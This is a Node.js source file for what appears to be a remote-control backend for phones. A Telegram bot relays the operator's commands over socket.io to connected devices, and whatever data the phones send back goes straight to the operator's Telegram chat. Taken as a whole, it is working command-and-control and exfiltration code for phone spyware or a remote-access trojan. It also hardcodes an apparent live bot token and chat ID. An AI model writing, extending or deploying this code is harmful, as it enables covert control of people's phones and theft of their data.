const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Telegraf } = require('telegraf');

const app = express();
const server = http.createServer(app);

// --- CONFIGURATION ---
const BOT_TOKEN = '8746887497:AAHNMQ2RAMI_iu9-KUVoKum72zZIsUhh00E';
const MY_CHAT_ID = '7066124462'; // Sirf aapko data bhejne ke liye
const bot = new Telegraf(BOT_TOKEN);

const io = new Server(server, {
    cors: { origin: "*" },
    allowEIO3: true 
});

// --- TELEGRAM LOGIC ---
// Jab aap Telegram par command likhenge
bot.on('text', (ctx) => {
    const command = ctx.message.text;
    
    // Agar command /start hai toh menu dikhao
    if (command === '/start') {
        return ctx.reply('Welcome! Send any command to the phone.');
    }

    // Yeh command Phone ko bhej do
    io.emit('phone_command', command);
    ctx.reply(`[>] Command Sent: ${command}`);
});

bot.launch();

// --- SOCKET LOGIC ---
app.get('/', (req, res) => res.send('Server & Bot are Live!'));

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);
    bot.telegram.sendMessage(MY_CHAT_ID, `📱 Phone Connected! \nID: ${socket.id}`);

    // Jab phone se data aaye
    socket.on('phone_data', (data) => {
        console.log('Data from Phone:', data);
        
        // Yeh data seedha aapke Telegram par bhej dega
        const message = `⚠️ *DATA RECEIVED* ⚠️\n\n${JSON.stringify(data, null, 2)}`;
        bot.telegram.sendMessage(MY_CHAT_ID, message, { parse_mode: 'Markdown' });
        
        // Termux ko bhi bhejte raho (optional)
        io.emit('termux_receive', data);
    });

    socket.on('disconnect', () => {
        bot.telegram.sendMessage(MY_CHAT_ID, '❌ Phone Disconnected.');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
            
